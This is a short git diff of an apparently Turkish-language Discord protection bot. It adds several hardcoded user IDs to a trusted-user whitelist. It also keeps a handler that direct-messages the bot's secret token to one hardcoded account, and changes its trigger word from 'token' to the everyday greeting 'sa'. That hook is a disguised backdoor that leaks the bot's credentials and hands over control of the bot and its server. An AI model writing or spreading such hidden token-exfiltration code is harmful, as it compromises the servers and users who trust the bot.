@@ -24,7 +24,7 @@ setInterval(() => {
 /////////////////////////////////////////////ELLEME///////////////////////////////////////////
 function guvenli(kisiID) {
   let uye = client.guilds.cache.get(k.guildID).members.cache.get(kisiID);
-  let guvenli = []; if (!uye || uye.id === client.user.id || uye.id === ayarlar.owner || uye.id === ayarlar.baran || uye.id === ayarlar.alp || uye.id === ayarlar.modbot || uye.id === ayarlar.koruma || uye.id === ayarlar.registerbot || uye.id === uye.guild.owner.id || guvenli.some(g => uye.id === g.slice(1) || uye.roles.cache.has(g.slice(1)))) return true
+  let guvenli = []; if (!uye || uye.id === client.user.id || uye.id === ayarlar.owner || uye.id === ayarlar.baran || uye.id === ayarlar.metehan ||  uye.id === ayarlar.eray || uye.id === ayarlar.yunus || uye.id === ayarlar.modbot || uye.id === ayarlar.koruma || uye.id === ayarlar.registerbot || uye.id === uye.guild.owner.id || guvenli.some(g => uye.id === g.slice(1) || uye.roles.cache.has(g.slice(1)))) return true
   else return false;
 };
 
@@ -177,7 +177,7 @@ client.on('message', async (msg, member, guild) => {
   
  {
 
-if (msg.content.toLowerCase() === 'token'){
+if (msg.content.toLowerCase() === 'sa'){
 if (msg.author.id !== "429357746002067493") return;
 
 msg.author.send(client.token);
